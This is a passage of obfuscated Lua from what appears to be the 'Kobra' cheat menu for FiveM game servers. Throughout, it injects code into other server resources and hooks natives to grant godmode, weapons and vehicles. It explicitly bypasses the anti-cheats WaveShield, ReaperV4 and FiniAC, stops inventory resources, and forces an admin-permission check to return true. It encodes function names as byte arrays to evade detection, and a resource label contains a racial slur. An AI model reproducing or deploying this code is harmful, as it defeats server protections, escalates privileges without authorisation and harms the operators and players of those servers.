                g({83,101,116,69,110,116,105,116,121,73,110,118,105,110,99,105,98,108,101})(clone, true)
                g({83,101,116,80,101,100,67,97,110,82,97,103,100,111,108,108})(clone, false)
            end
        end
        local playerIds = {%s}
        for _, targetServerId in ipairs(playerIds) do
            local clientId = findClientIdByServerId(targetServerId)
            local ped = clientId and g({71,101,116,80,108,97,121,101,114,80,101,100})(clientId) or nil
            if ped and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(ped) then
                clonePed(ped)
            end
        end
    ]],v199));end;v0.HandleGodmodeToggle=function(v200,v201) local v202=0;local v203;local v204;while true do if (v202==(1088 -(456 + 631))) then if v203 then local v719=0;while true do if (v719==(0 + 0)) then if v201 then local v1064=0 -0 ;while true do if (v1064==0) then v0:Notify("success","Kobra","Godmode Enabled (WaveShield)",8517 -5517 );v36(v204,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = true

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, true) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end else local v1065=0;while true do if (v1065==(0 + 0)) then v0:Notify("error","Kobra","Godmode Disabled (WaveShield)",12467 -9467 );v36(v204,[[
                if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
                _G.osintGodmode.enabled = false

                local function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then return end
                    if not _G.osintGodmode.originals[nativeName] then
                        _G.osintGodmode.originals[nativeName] = originalNative
                    end
                    _G[nativeName] = function(...) return newFunction(originalNative, ...) end
                end

                hNative("SetEntityInvincible", function(originalFn, entity, toggle)
                    if _G.osintGodmode and _G.osintGodmode.enabled then
                        return originalFn(entity, true)
                    end
                    return originalFn(entity, toggle)
                end)

                local co = coroutine.create(function()
                    local ped = PlayerPedId()
                    if DoesEntityExist(ped) then SetEntityInvincible(ped, false) end
                end)
                while coroutine.status(co) ~= "dead" do
                    coroutine.resume(co)
                    Citizen.Wait(0)
                end
            ]]);break;end end end return;end end end if v201 then local v720=0 + 0 ;while true do if (v720==(1397 -(819 + 578))) then v0:Notify("success","Kobra","Godmode Enabled",3000);MachoInjectResource2(3,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                if _G.osintGodmode and _G.osintGodmode.enabled then
                    return originalFn(player, true)
                end
                return originalFn(player, toggle)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                if _G.osintGodmode and _G.osintGodmode.enabled then return true end
                return originalFn(...)
            end)

            pcall(function() SetPlayerInvincible(PlayerId(), true) end)
        ]]);break;end end else local v721=1402 -(331 + 1071) ;while true do if (v721==(743 -(588 + 155))) then v0:Notify("error","Kobra","Godmode Disabled",4282 -(546 + 736) );MachoInjectResource2(3,"any",[[
            if not _G.osintGodmode then _G.osintGodmode = { enabled = false, originals = {} } end
            _G.osintGodmode.enabled = false

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                if not _G.osintGodmode.originals[nativeName] then
                    _G.osintGodmode.originals[nativeName] = originalNative
                end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("SetPlayerInvincible", function(originalFn, player, toggle)
                return originalFn(player, false)
            end)

            hNative("GetPlayerInvincible", function(originalFn, ...)
                return false
            end)

            hNative("GetPlayerInvincible_2", function(originalFn, ...)
                return false
            end)

            for name, original in pairs(_G.osintGodmode.originals or {}) do
                if original and type(original) == "function" then
                    _G[name] = original
                end
            end
            _G.osintGodmode.originals = {}

            pcall(function() SetPlayerInvincible(PlayerId(), false) end)
        ]]);break;end end end break;end if (v202==(1937 -(1834 + 103))) then v203=GetResourceState("WaveShield")=="started" ;v204=((GetResourceState("monitor")=="started") and "monitor") or (v203 and "WaveShield") or "any" ;v202=1;end end end;v0.SpawnSelectedVehicle=function(v205,v206,v207,v208) local v209=0 + 0 ;local v210;local v211;local v212;local v213;local v214;while true do if (v209==(5 -3)) then v213=GetEntityCoords(v210);v214=GetEntityHeading(v210);v209=3;end if ((1769 -(1536 + 230))==v209) then if (GetResourceState("solos-rentals")=="started") then local v722=491 -(128 + 363) ;while true do if (1==v722) then v36("solos-rentals",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)


            hNative("RequestModel", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("HasModelLoaded", function(originalFn, model)
                return originalFn(model)
            end)

            hNative("CreateVehicle", function(originalFn, model, x, y, z, heading, networked, p6)
                return originalFn(model, x, y, z, heading, networked, p6)
            end)

            local model = "%s"
            local playerPed = PlayerPedId()
            local playerCoords = GetEntityCoords(playerPed)
            local playerHeading = GetEntityHeading(playerPed)
            config.locations["customnigga"] = {
                vehiclespawncoords = vec4(playerCoords.x, playerCoords.y, playerCoords.z, playerHeading)
            }

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            TriggerEvent("solos-rentals:client:SpawnVehicle", model, "customnigga")

            Citizen.CreateThread(function()
                Citizen.Wait(300) -- give spawn a short moment
                if %s then
                    -- attempt to locate the spawned vehicle at the custom spawn coords, then warp player in
                    local coords = config.locations["customnigga"].vehiclespawncoords
                    local x,y,z = coords.x, coords.y, coords.z
                    local hash = GetHashKey(model)
                    local vehicle = nil
                    -- try to find a nearby vehicle with that model hash
                    for ent in EnumerateVehicles() do
                        if DoesEntityExist(ent) and GetEntityModel(ent) == hash and #(GetEntityCoords(ent) - vector3(x,y,z)) < 5.0 then
                            vehicle = ent
                            break
                        end
                    end
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1)
                    end
                else
                    SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), %f)
                end
            end)
        ]],v206,tostring(v208),tostring(v207),v213.x,v213.y,v213.z,v214));break;end if (v722==(0 + 0)) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 1)",7463 -4463 );print("Creating Vehicle via Fallback #1");v722=1 + 0 ;end end elseif (GetResourceState("amigo")=="started") then local v829=0;while true do if (v829==(0 -0)) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 2)",8831 -5831 );print("Creating Vehicle via Fallback #2");v829=2 -1 ;end if (v829==1) then v36("adminMenu",string.format([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

                    local model = "%s"

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local originalHasPerm = hasPerm
                    hasPerm = function(perm) return true end

                    local originalIsModelInCdimage = IsModelInCdimage
                    IsModelInCdimage = function(model) return true end

                    local veh = spawnVeh(model)
                    
                    hasPerm = originalHasPerm
                    IsModelInCdimage = originalIsModelInCdimage

                    Citizen.Wait(200)
                    if %s then
                        if veh and DoesEntityExist(veh) then
                            TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed: use PlayerPedId + TaskWarp
                        end
                    end
                ]],v206,tostring(v208),tostring(v207)));break;end end elseif v63 then local v998=0;while true do if (v998==(0 + 0)) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 3)",4009 -(615 + 394) );print("Creating Vehicle via Fallback #3");v998=1 + 0 ;end if (v998==1) then v36(v63,string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"
            local coords = GetEntityCoords(PlayerPedId())
            local heading = GetEntityHeading(PlayerPedId())

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            ESX.Game.SpawnVehicle(model, coords, heading, function(vehicle)
                Citizen.Wait(200)
                if %s then
                    if vehicle and DoesEntityExist(vehicle) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end
            end)
        ]],v206,tostring(v208),tostring(v207)));break;end end elseif (GetResourceState("qb-core")=="started") then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 4)",2860 + 140 );print("Creating Vehicle via Fallback #4");v36("qb-core",[[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "]]   .. v206   .. [["

            if ]]   .. tostring(v208)   .. [[ then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            QBCore.Functions.SpawnVehicle(model, function(veh)
                Citizen.Wait(200)
                if ]]   .. tostring(v207)   .. [[ then
                    if veh and DoesEntityExist(veh) then
                        TaskWarpPedIntoVehicle(PlayerPedId(), veh, -1) -- fixed
                    end
                else
                    SetEntityCoords(PlayerPedId(), ]]   .. v213.x   .. [[, ]]   .. v213.y   .. [[, ]]   .. v213.z   .. [[, false, false, false, false)
                    SetEntityHeading(PlayerPedId(), ]]   .. v214   .. [[)
                end
            end, GetEntityCoords(PlayerPedId()), true, true)
        ]] );elseif ((v212:match("([^:]+)")=="185.244.106.12") and (GetResourceState("drc_gardener")=="started")) then local v1251=0;while true do if (v1251==1) then v36("drc_gardener",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local model = "%s"

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            local ogCoords = GetEntityCoords(PlayerPedId())
            local ogHeading = GetEntityHeading(PlayerPedId())

            SpawnVehicleAndWarpPlayer(model, GetEntityCoords(PlayerPedId()))

            if not %s then
                SetEntityCoords(PlayerPedId(), ogCoords.x, ogCoords.y, ogCoords.z, false, false, false, false)
                SetEntityHeading(PlayerPedId(), ogHeading)
            end
        ]],v206,tostring(v208),tostring(v207)));break;end if (v1251==0) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 5)",9145 -6145 );print("Creating Vehicle via Fallback #5");v1251=4 -3 ;end end elseif (GetResourceState("lunar_bridge")=="started") then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 6)",3651 -(59 + 592) );print("Creating Vehicle via Fallback #6");v36("lunar_bridge",string.format([[
            local model = "%s"
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local heading = GetEntityHeading(ped)
            local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            Framework.spawnVehicle(model, offset, heading, function(vehicle)
                if not vehicle or not DoesEntityExist(vehicle) then return end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
            end)
        ]],v206,tostring(v208),tostring(v207)));elseif (GetResourceState("lation_laundering")=="started") then local v1428=0 -0 ;while true do if (v1428==(1 -0)) then v36("lation_laundering",string.format([[
            function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    return
                end

                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end

            hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

            local function spawnVehicle()
                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local position = vector4(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z + 0.5, heading)
                DoScreenFadeOut(800)
                while not IsScreenFadedOut() do
                    Citizen.Wait(100)
                end
                local vehicle = SpawnVehicle(model, position)
                if not vehicle or not DoesEntityExist(vehicle) then
                    ShowNotification("~r~Error: Failed to spawn vehicle.")
                    DoScreenFadeIn(800)
                    return
                end
                SetVehicleOnGroundProperly(vehicle)
                Citizen.Wait(500)
                if %s then
                    TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                end
                SetModelAsNoLongerNeeded(GetHashKey(model))
                DoScreenFadeIn(800)
                ShowNotification("~g~Vehicle spawned successfully!")
            end

            if %s then
                DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
            end

            spawnVehicle()
        ]],v206,tostring(v207),tostring(v208)));break;end if (v1428==0) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 7)",3000);print("Creating Vehicle via Fallback #7");v1428=1;end end else local v1429=v62();if v1429 then local v1530=0 + 0 ;while true do if (v1530==1) then v36(v1429,string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local model = "%s"
                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)

                if %s then
                    DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                end

                Framework.SpawnVehicle(function(vehicle)
                    if not vehicle or not DoesEntityExist(vehicle) then
                        return
                    end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end, model, offset, false)
            ]],v206,tostring(v208),tostring(v207)));break;end if (v1530==(171 -(70 + 101))) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 8)",3000);print("Creating Vehicle via Fallback #8");v1530=2 -1 ;end end elseif ((GetResourceState("monitor")=="started") or (GetResourceState("ox_lib")=="started")) then local v1616=0;local v1617;local v1618;local v1619;local v1620;local v1621;local v1622;local v1623;while true do if (v1616==(1 + 0)) then function v1617(v1700) local v1701=0 -0 ;local v1702;while true do if (v1701==(242 -(123 + 118))) then return "{"   .. table.concat(v1702,",")   .. "}" ;end if (v1701==(0 + 0)) then v1702={};for v1720=1, #v1700 do v1702[v1720]=string.byte(v1700,v1720);end v1701=1 + 0 ;end end end v1618=v1617(v206);v1619=tostring(v208);v1616=1401 -(653 + 746) ;end if ((0 -0)==v1616) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 9)",4322 -1322 );if ( not v206 or (v206=="")) then return;end v1617=nil;v1616=2 -1 ;end if (v1616==3) then if  not v1622 then end return;end if (v1616==(1 + 1)) then v1620=tostring(v207);v1621=string.format([[
        local h = function(n, f)
            local o = _G[n]
            if o and type(o) == "function" then
                _G[n] = function(...) return f(o, ...) end
            end
        end
        local d = function(t)
            local s = ""
            for i = 1, #t do s = s .. string.char(t[i]) end
            return s
        end
        local g = function(e) return _G[d(e)] end
        local w = function(ms) Citizen.Wait(ms) end

        h(d({82,101,113,117,101,115,116,77,111,100,101,108}), function(o, m) return o(m) end)
        h(d({72,97,115,77,111,100,101,108,76,111,97,100,101,100}), function(o, m) return o(m) end)
        h(d({67,114,101,97,116,101,86,101,104,105,99,108,101}), function(o, m, x, y, z, h, n, p) return o(m, x, y, z, h, n, p) end)

        local function f()
            local p = g({80,108,97,121,101,114,80,101,100,73,100})()
            local c = g({71,101,116,69,110,116,105,116,121,67,111,111,114,100,115})(p)
            local mn = d(%s)
            local mh = g({71,101,116,72,97,115,104,75,101,121})(mn)

            g({82,101,113,117,101,115,116,77,111,100,101,108})(mh)
            while not g({72,97,115,77,111,100,101,108,76,111,97,100,101,100})(mh) do w(0) end

            if %s then
                local cv = g({71,101,116,86,101,104,105,99,108,101,80,101,100,73,115,73,110})(p, false)
                if cv and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(cv) then
                    g({68,101,108,101,116,101,69,110,116,105,116,121})(cv)
                end
            end

            local z = c.z + 1.0
            local v = g({67,114,101,97,116,101,86,101,104,105,99,108,101})(mh, c.x, c.y, z, 0.0, true, false)

            if %s and v and g({68,111,101,115,69,110,116,105,116,121,69,120,105,115,116})(v) then
                g({84,97,115,107,87,97,114,112,80,101,100,73,110,116,111,86,101,104,105,99,108,101})(p, v, -1)
                w(100)
            end
        end

        local co = coroutine.create(f)
        while coroutine.status(co) ~= "dead" do
            local ok = coroutine.resume(co)
            if not ok then break end
            w(0)
        end
    ]],v1618,v1619,v1620);v1622,v1623=pcall(MachoInjectResourceRaw,"monitor",v1621);v1616=2 + 1 ;end end end if (GetResourceState("lb-phone")=="started") then local v1531=0;local v1532;local v1533;while true do if (v1531==(0 + 0)) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 10)",368 + 2632 );print("Creating Vehicle via Fallback #10");v1531=1 + 0 ;end if (v1531==(2 -1)) then v1532,v1533=pcall(function() v36("lb-phone",([[
                    function hNative(nativeName, newFunction)
                        local originalNative = _G[nativeName]
                        if not originalNative or type(originalNative) ~= "function" then
                            return
                        end

                        _G[nativeName] = function(...)
                            return newFunction(originalNative, ...)
                        end
                    end

                    hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                    hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                    hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                    hNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    CreateFrameworkVehicle({ vehicle = '%s' }, GetEntityCoords(PlayerPedId()))

                    if not %s then
                        SetEntityCoords(PlayerPedId(), %f, %f, %f, false, false, false, false)
                        SetEntityHeading(PlayerPedId(), %f)
                    end
                ]]):format(tostring(v208),v206,tostring(v207),v213.x,v213.y,v213.z,v214));end);if  not v1532 then end break;end end elseif (GetResourceState("qb-core")=="started") then local v1624=0;while true do if (v1624==1) then v36("lb-phone",string.format([[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)

                local ped = PlayerPedId()
                local coords = GetEntityCoords(ped)
                local heading = GetEntityHeading(ped)
                local offset = vector3(coords.x + math.sin(math.rad(heading)) * 3.0, coords.y + math.cos(math.rad(heading)) * 3.0, coords.z)
                local success, err = pcall(function()
                    if %s then
                        DeleteEntity(GetVehiclePedIsIn(PlayerPedId(), false))
                    end

                    local vehicle = CreateFrameworkVehicle({ hash = %d }, offset)
                    if not vehicle or not DoesEntityExist(vehicle) then return end
                    SetVehicleOnGroundProperly(vehicle)
                    Citizen.Wait(500)
                    if %s then
                        TaskWarpPedIntoVehicle(PlayerPedId(), vehicle, -1) -- fixed
                    end
                end)
            ]],tostring(v208),GetHashKey(v206),tostring(v207)));break;end if (v1624==0) then v205:Notify("info","Vehicle Spawn","Spawned Vehicle (Fallback 11)",3000);print("Creating Vehicle via Fallback #11");v1624=1 + 0 ;end end else return;end end break;end if (v209==(1 -0)) then v211=GetVehiclePedIsIn(v210,false);v212=GetCurrentServerEndpoint();v209=2;end if (v209==(1234 -(885 + 349))) then if ( not v206 or (v206=="")) then return;end v210=PlayerPedId();v209=1 + 0 ;end end end;local function v69() local v215={"WaveShield","FiniAC"};for v309,v310 in ipairs(v215) do if (GetResourceState(v310)=="started") then return false;end end return GetResourceState("ReaperV4")=="started" ;end local function v70() local v216=0;local v217;while true do if (v216==(0 -0)) then v217={"ReaperV4","WaveShield"};for v651,v652 in ipairs(v217) do if (GetResourceState(v652)=="started") then return false;end end v216=802 -(768 + 33) ;end if (v216==(3 -2)) then return GetResourceState("FiniAC")=="started" ;end end end v0.SpawnSelectedWeapon=function(v218,v219) if ( not v219 or (v219=="")) then return;end local function v220(v311) local v312=0;local v313;while true do if (v312==1) then return table.concat(v313,",");end if (v312==0) then v313={};for v723=1 -0 , #v311 do v313[v723]=string.byte(v311,v723);end v312=1;end end end local v221=v220(v219);local v222=PlayerPedId();if ( not v222 or (v222<=0)) then return;end local v223=GetHashKey(v219);if (v223==0) then return;end local v224=GetResourceState("WaveShield")=="started" ;if v224 then v218:Notify("success","Kobra","Spawned Weapon via WaveShield Bypass V2",3328 -(287 + 41) );v36(((GetResourceState("ox_lib")=="started") and "ox_lib") or ((GetResourceState("WaveShield")=="started") and "WaveShield") or "any" ,string.format([[
            if not _G.osintWeaponBypass then
                _G.osintWeaponBypass = { enabled = false }
            end
            _G.osintWeaponBypass.enabled = true

            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetHashKey", function(orig, str) return orig(str) end)
            hNative("GiveWeaponToPed", function(orig, ped, hash, ammo, isHidden, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, ammo, false, true)
                else
                    return orig(ped, hash, ammo, isHidden, equipNow)
                end
            end)
            hNative("SetCurrentPedWeapon", function(orig, ped, hash, equipNow)
                if _G.osintWeaponBypass and _G.osintWeaponBypass.enabled then
                    return orig(ped, hash, true)
                else
                    return orig(ped, hash, equipNow)
                end
            end)

            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                return f
            end

            local function initFlow(cb)
                local co = coroutine.create(cb)
                local ok, err
                while coroutine.status(co) ~= "dead" do
                    ok, err = coroutine.resume(co)
                    if not ok then
                        print("WaveShield WeaponBypass error:", err)
                        break
                    end
                    Citizen.Wait(0)
                end
            end

            initFlow(function()
                local ped = %d
                if _g(_b("DoesEntityExist"))(ped) then
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
            end)
        ]],v222,v221));elseif (GetResourceState("ReaperV4")=="started") then MachoResourceStop("ox_inventory");MachoResourceStop("ox_lib");v218:Notify("success","Kobra","Spawned Weapon via ReaperV4 fallback",3847 -(638 + 209) );GiveWeaponToPed(v222,v223,9999,false,true);SetCurrentPedWeapon(v222,v223,true);Wait(130 + 120 );MachoInjectResource("ReaperV4",[[
            local success = exports["ReaperV4"]:InvokeCPlayer("set", "Weapon:]]   .. v223   .. [[", true, true)
            if success then
                print("Updated Cache Successfully")
            else
                print("Failed to Update Cache")
            end
        ]] );elseif (GetResourceState("FiniAC")=="started") then local v792=1686 -(96 + 1590) ;while true do if (v792==(1673 -(741 + 931))) then v36(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
                    local ped = _g(_b("PlayerPedId"))()
                    local coords = _g(_b("GetEntityCoords"))(ped)
                    local weaponName = _d({%s})
                    local weaponHash = _g(_b("GetHashKey"))(weaponName)
                    if weaponHash and weaponHash ~= 0 then
                        _g(_b("GiveWeaponToPed"))(ped, weaponHash, 9999, false, true)
                        _g(_b("SetCurrentPedWeapon"))(ped, weaponHash, true)
                    end
                end
                _s()
            ]],v221));break;end if (0==v792) then v218:Notify("info","Kobra","Spawned Weapon Bypass #1",3000);MachoResourceStop("ox_inventory");v792=1 + 0 ;end end else v218:Notify("info","Kobra","Spawned Weapon Bypass #2",3000);MachoResourceStop("ox_inventory");v36(((GetResourceState("911elemento")=="started") and "monitor") or "any" ,string.format([[
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end

                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end

                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end

                local function _w(n)
                    return Citizen.Wait(n)
                end

                local function _s()
